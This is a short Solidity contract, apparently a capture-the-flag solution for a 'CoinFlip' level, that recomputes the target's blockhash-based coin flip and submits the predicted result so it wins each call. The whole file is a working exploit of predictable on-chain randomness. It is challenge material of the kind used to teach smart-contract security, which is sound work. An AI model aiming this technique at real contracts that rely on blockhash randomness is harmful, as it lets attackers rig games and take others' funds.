// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "./CoinFlip.sol";

contract CoinFlipSolution {
    CoinFlip public coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address levelAddress) {
        coinFlip = CoinFlip(levelAddress);
    }

    function solve() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1;

        coinFlip.flip(side);
    }
}
